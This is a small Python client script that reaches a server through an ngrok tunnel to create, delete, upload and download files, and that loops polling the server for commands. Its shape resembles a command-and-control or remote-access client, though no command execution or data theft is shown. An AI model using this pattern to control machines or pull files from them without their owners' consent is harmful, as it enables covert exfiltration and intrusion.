import requests

# Replace this with the ngrok tunnel URL
ngrok_url = "https://abcd1234.ngrok.io" #I manually have to replace this since I don't have an ngrok subscription

def make_file(file_name):
    """
    Create a file with the given file name on the server
    """
    response = requests.post(f"{ngrok_url}/make/{file_name}")
    if response.status_code != 200:
        print(f"Error creating file: {response.text}")

def delete_file(file_name):
    """
    Delete the file with the given file name from the server
    """
    response = requests.post(f"{ngrok_url}/delete/{file_name}")
    if response.status_code != 200:
        print(f"Error deleting file: {response.text}")

def upload_file(local_file_path, remote_file_path):
    """
    Upload a local file to the given remote file path on the server
    """
    files = {"file": open(local_file_path, "rb")}
    response = requests.post(f"{ngrok_url}/upload/{remote_file_path}", files=files)
    if response.status_code != 200:
        print(f"Error uploading file: {response.text}")

def download_file(remote_file_path, local_file_path):
    """
    Download a remote file to the given local file path from the server
    """
    response = requests.get(f"{ngrok_url}/download/{remote_file_path}")
    with open(local_file_path, "wb") as f:
        f.write(response.content)

def wait_for_command():
    """
    Wait for a command from the server
    """
    while True:
        response = requests.get(f"{ngrok_url}/command")
        if response.status_code == 200:
            return response.text
